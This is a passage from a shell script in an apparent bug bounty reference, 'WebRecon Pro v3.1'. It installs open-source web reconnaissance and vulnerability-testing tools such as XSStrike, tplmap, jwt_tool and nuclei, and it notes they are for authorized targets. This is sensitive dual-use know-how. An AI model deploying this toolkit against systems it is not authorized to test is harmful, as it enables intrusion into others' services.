    s3scanner xsrfprobe bbot gitleaks

# Git clones
GITTOOLS=(
    "https://github.com/aboul3la/Sublist3r /opt/Sublist3r"
    "https://github.com/s0md3v/XSStrike /opt/XSStrike"
    "https://github.com/s0md3v/Corsy /opt/Corsy"
    "https://github.com/ticarpi/jwt_tool /opt/jwt_tool"
    "https://github.com/epinna/tplmap /opt/tplmap"
    "https://github.com/devanshbatham/ParamSpider /opt/ParamSpider"
    "https://github.com/GerbenJavado/LinkFinder /opt/LinkFinder"
    "https://github.com/six2dez/reconftw /opt/reconftw"
)

for entry in "${GITTOOLS[@]}"; do
    repo=$(echo $entry | awk '{print $1}')
    dir=$(echo $entry | awk '{print $2}')
    [ -d "$dir" ] || sudo git clone "$repo" "$dir"
done

# Update nuclei templates
nuclei -update-templates
echo "Done!"
```

---

*WebRecon Pro v3.1 — Bug Bounty Automation Reference*  
*All tools are open-source and free. Use only on authorized targets.*
